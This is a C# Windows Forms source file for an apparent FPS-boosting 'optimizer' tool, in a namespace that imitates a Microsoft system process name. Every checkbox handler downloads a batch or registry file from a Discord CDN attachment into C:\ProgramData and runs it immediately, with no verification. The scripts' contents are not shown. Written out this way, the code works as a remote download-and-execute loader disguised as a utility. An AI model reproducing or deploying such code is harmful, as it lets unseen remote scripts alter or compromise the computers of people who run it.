using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ServiceHub.Host.CLR.x64
{
    public partial class Optimal : Form
    {

        public Optimal()
        {
            InitializeComponent();
        }
        private WebClient webclient = new WebClient();


        private void guna2CheckBox1_CheckedChanged(object sender, EventArgs e)
        {
            string fileName = "C:\\ProgramData\\reg.bat";
            string address = "https://cdn.discordapp.com/attachments/993699321985912903/995542650717483150/F39F.bat";
            bool flag = File.Exists(fileName);
            if (flag)
            {
                File.Delete(fileName);
            }
            this.webclient.DownloadFile(address, fileName);
            Process.Start(fileName);
        }

        private void guna2CheckBox4_CheckedChanged(object sender, EventArgs e)
        {
            string fileName = "C:\\ProgramData\\reg.bat";
            string address = "https://cdn.discordapp.com/attachments/961832880487669770/980112862322249828/BOOST_WIFIBIG_OPTIMIZE.bat";
            bool flag = File.Exists(fileName);
            if (flag)
            {
                File.Delete(fileName);
            }
            this.webclient.DownloadFile(address, fileName);
            Process.Start(fileName);
        }

        private void guna2CheckBox3_CheckedChanged(object sender, EventArgs e)
        {
            string fileName = "C:\\ProgramData\\reg.reg";
            string address = "https://cdn.discordapp.com/attachments/990793985125679134/994164750193807480/FPS_REGEDIT_BS4.reg";
            bool flag = File.Exists(fileName);
            if (flag)
            {
                File.Delete(fileName);
            }
            this.webclient.DownloadFile(address, fileName);
            Process.Start(fileName);
        }

        private void guna2CheckBox2_CheckedChanged(object sender, EventArgs e)
        {
            string fileName = "C:\\ProgramData\\boost_fps.bat";
            string address = "https://cdn.discordapp.com/attachments/989184647579717652/989758743002644480/boost_fps.bat";
            bool flag = File.Exists(fileName);
            if (flag)
            {
                File.Delete(fileName);
            }
            this.webclient.DownloadFile(address, fileName);
            Process.Start(fileName);
        }

        private void guna2CheckBox6_CheckedChanged(object sender, EventArgs e)
        {
            string fileName = "C:\\ProgramData\\Optimize_7.bat";
            string address = "https://cdn.discordapp.com/attachments/989184647579717652/989191366292672562/Optimize_7.bat";
            bool flag = File.Exists(fileName);
            if (flag)
            {
                File.Delete(fileName);
            }
            this.webclient.DownloadFile(address, fileName);
            Process.Start(fileName);
        }

        private void guna2CheckBox5_CheckedChanged(object sender, EventArgs e)
        {

            string fileName = "C:\\ProgramData\\reg.bat";
            string address = "https://cdn.discordapp.com/attachments/993699321985912903/995549635299004516/figlagbyZerKey.bat";
            bool flag = File.Exists(fileName);
            if (flag)
            {
                File.Delete(fileName);
            }
            this.webclient.DownloadFile(address, fileName);
            Process.Start(fileName);
        }

        private void guna2CheckBox8_CheckedChanged(object sender, EventArgs e)
        {

            string fileName = "C:\\ProgramData\\boost_fps.bat";
            string address = "https://cdn.discordapp.com/attachments/989184647579717652/989758743002644480/boost_fps.bat";
            bool flag = File.Exists(fileName);
            if (flag)
            {
                File.Delete(fileName);
            }
            this.webclient.DownloadFile(address, fileName);
            Process.Start(fileName);
        }

        private void guna2CheckBox7_CheckedChanged(object sender, EventArgs e)
        {
            string fileName = "C:\\ProgramData\\boost_fps.bat";
            string address = "https://cdn.discordapp.com/attachments/989184647579717652/989758743002644480/boost_fps.bat";
            bool flag = File.Exists(fileName);
            if (flag)
            {
                File.Delete(fileName);
            }
            this.webclient.DownloadFile(address, fileName);
            Process.Start(fileName);
        }

        private void guna2Panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void Optimal_Load(object sender, EventArgs e)
        {

        }
    }
}
